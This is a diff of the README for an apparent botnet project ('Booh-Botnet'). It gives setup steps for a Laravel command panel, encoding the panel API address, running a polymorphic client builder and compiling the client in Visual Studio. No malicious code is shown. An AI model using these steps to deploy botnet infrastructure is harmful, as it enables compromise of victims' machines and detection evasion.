@@ -6,15 +6,10 @@
  # How To Instal
  * [Panel(Laravel)](#Panel)
  * [Polymorphic_Builder](#Polymorphic_Builder)
- * [Live Preview](#Preview)
-
-
-
-# Preview
 
 
 # Panel
-  This panel was created on Laravel framework, There is already a lot of documentation on how to install on the internet, google it!
+  This panel was created on Laravel framework, There is already a lot of documentation on how to install it on the internet, google it!
 
   Any problem Send me Msg.
 
@@ -27,7 +22,7 @@
   * `**Python3** `
 
 
-  **First** create a user for the panel, for simplicity I created a route to do it
+  **First** - Create a panel user, for simplicity I created a route to do it
 
    "www.Your-Panel-Ip.com/createUser/{username}/{password}"
 
@@ -44,7 +39,7 @@
   ```php
   Route :: get ('/ createUser / {username} / {password}', 'Auth_Controller @ createUser')
   ```
- **Second** save the PanelKey and CrypthKey then you need to base64 encode your panel Ip/domain like that 
+ **Second** - Save the PanelKey and CrypthKey then you need to base64 encode your panel Ip/domain like that 
    
    * ` http://You-Panel-ip/Api ` 
    
@@ -60,7 +55,7 @@
    
    
    
-  **Third** Go to polymorphic builder folder with terminal and use the command :
+  **Third** - Go to polymorphic builder folder with terminal and use the command :
    
   ```python
      python3 main.py
@@ -72,7 +67,15 @@
    
    
    
-   **Four** Now we need to compile. To do it we just need to use Visual Studio 2017 and the client is ready.
+   **Four** - Now we just need to compile. To do it you need open the folder named "Server" and click on .sln file to open with Visual Studio 2017 then Compile.
+   
+   
+   ![alt text](https://github.com/FilipeBorges1993/Booh-Botnet/raw/master/Screen%20Shot%202018-04-10%20at%2019.09.52.png)
+   
+   
+   
+   
+   
    
    
      
